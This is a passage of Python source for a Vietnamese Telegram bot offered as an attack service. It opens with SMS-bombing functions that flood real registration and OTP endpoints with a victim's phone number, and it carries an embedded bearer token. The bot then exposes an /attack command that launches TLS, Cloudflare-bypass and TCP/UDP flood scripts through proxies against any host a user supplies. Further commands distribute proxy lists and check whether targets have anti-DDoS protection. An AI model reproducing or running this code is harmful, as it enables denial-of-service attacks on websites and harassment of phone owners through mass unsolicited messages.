ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjkxMzk1MzEsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.eso0bGJdqAUjaHET0iEXUm7I83kwoyNe22_2JjjLbT8AHDZhTf_RNvj0OuxR6AeYJb39_8uI-2ytJaH48oX1mYQUyJjXG-pl4RhA2h0Q6n9znHSVVIrfSR8eSsXoKuEbOnF9VbceXoOMPGTmZ_C5DhwAEmbQNdRcbYRPuIQT6M8tXGVsKfjKU-f80wAPDXwwnKlQsmd2SllLL7dmjzg5lF6MGLzihd6Rm4g5r49qUVsRQPYt1Os7ysIM2eC7cXMDTaXNXs8SBcdcPK2xreN7oOAXhvuyHCMq1RkDKy37owtDUJJLChQIeaTb57y_ecIajQJ0zMKkejoJ7ZQftLi6P54MUT0MUNHOipOvNBgeureOQZ-LljM9MWBIMqb7_kqH3U_J-DYdlTNcDiw8_oV5WufnD4AWdWkttw9rggek8FmvDd0nrYJAdgV8_xDMJmmXeapwuTwoIrR5WZTS7GzZ_wrpthD5nPbrRfdIIOSc0LtMPd4WQore-T-iM65IL8QzUbavp4hlZPJJmGDA_q2MBLRoJOAnbBw4qVw7YxUIfQRfWdBIXlbcxfGydEM2NgqF7Vu7BM8BwQNDXhKZJoKlPcbImlFDOyqmCxpdWIcUgcl5xDLzjefHYEdxQDpPPB7Ro02mz8JxAqAL4RMHsQKJtmRUK7B0eFYkvZkpZjSM-8o',
    'Origin': 'https://ubofood.com',
    'Referer': 'https://ubofood.com/register',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
      data = f'{{"phone_number":"{phone_number}","trade_code":"101019000"}}'
      response = requests.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data)
    def best(phone_number):
      headers = {
    'Accept-Language': 'en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7',
    'Connection': 'keep-alive',
    'Origin': 'https://best-inc.vn',
    'Referer': 'https://best-inc.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'accept': 'application/json',
    'authorization': 'null',
    'content-type': 'application/json',
    'lang-type': 'vi-VN',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'x-auth-type': 'web-app',
    'x-lan': 'VI',
    'x-nat': 'vi-VN',
    'x-timezone-offset': '7',
}
      json_data = {
    'phoneNumber': phone_number,
    'verificationCodeType': 1,
}
      response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
    
    dplus(phone_number)
    f88(phone_number)
    fpt(phone_number)
    dplus(phone_number)
    tv360(phone_number)
    kingf(phone_number)
    best(phone_number)
    onc(phone_number)
    pzc(phone_number)
    pl(phone_number)
    onc(phone_number)
    em(phone_number)
    aha(phone_number)
    dplus(phone_number)
    hn(phone_number)
    glx(phone_number)
    onc(phone_number)
    vay(phone_number)
    ubo(phone_number)
    dplus(phone_number)

    bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Spam Thành Công!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Số Tấn Công: {phone_number} \n┣➤  Admin: @Mnghiadz \n┗━━━━━━━━━━━━━━➤')
@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
📌 Tất Cả Methods:
🚀 Layer7 
[ Không Gov, Edu ]
TLS
DESTROY
CF-BYPASS
[ Được Pem Gov, Edu]
GOD 
🚀 Layer4
TCP-FLOOD
UDP-FLOOD
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 60:
                cmd_process.terminate()
                bot.reply_to(message, "Đã Dừng Lệnh Tấn Công, Cảm Ơn Bạn Đã Sử Dụng")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Vui lòng nhập cả port.\nVí dụ: /attack {method} {host} [port]')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn", "chinhphu.vn"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Không được phép tấn công trang web có tên miền {blocked_domain}")
                return

    if method in ['TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLS.js", host, "60", "64", "30","proxy.txt"]
            duration = 60
        elif method == 'GOD':
            command = ["node", "GOD.js", host, "60", "64", "30"]
            duration = 60
        elif method == 'DESTROY':
            command = ["node", "destroy.js", host, "60", "64", "30", "proxy.txt"]
            duration = 60
        elif method == 'CF-BYPASS':
            command = ["node", "CFBYPASS.js", host, "60", "64", "30", "proxy.txt"]
            duration = 60
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "udp.py", host, port, "90", "64", "10"]
            duration = 90
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port phải là một số nguyên dương.')
                return
            command = ["python", "tcp.py", host, port, "90", "64", "10"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Successful Attack!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Giây\n┣➤Admin:t.me/Tthanh1402 \n┗━━━━━━━━━━━━━━➤')
    else:
        bot.reply_to(message, 'Phương thức tấn công không hợp lệ. Sử dụng lệnh /methods để xem phương thức tấn công')

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"Số lượng proxy: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Không tìm thấy file proxy.txt.")
    else:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"Số proxy mới update là: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot đã được tắt. Tất cả người dùng không thể sử dụng lệnh khác.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot đã được khởi động lại. Tất cả người dùng có thể sử dụng lại lệnh bình thường.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Không thể lấy mã nguồn từ trang web này. Vui lòng kiểm tra lại URL.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang web không phải là HTML hoặc PHP. Vui lòng thử với URL trang web chứa file HTML hoặc PHP.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'Có lỗi xảy ra: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui lòng nhập đúng cú pháp.\nVí dụ: /check + [link website]')
        return

    url = message.text.split()[1]
    
    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loại bỏ tiền tố "www" nếu có
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip của website: {url}\nLà: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website có 1 ip có khả năng không antiddos."
        else:
            reply += "Website có nhiều hơn 1 ip khả năng antiddos rất cao.\nKhông thể tấn công website này."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra: {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: t.me/Tthanh1402")
@bot.message_handler(commands=['sms'])
def sms(message):
    pass


# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui lòng nhập Key\nSử dụng lệnh /getkey để lấy Key')
        return

    try:
        with open("proxybynhakhoahoc.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Phút Tự Update\nSố lượng proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxybynhakhoahoc.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Không tìm thấy file proxy.txt.")


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} giờ, {minutes} phút, {seconds} giây'
    bot.reply_to(message, f'Bot Đã Hoạt Động Được: {uptime_str}')


@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
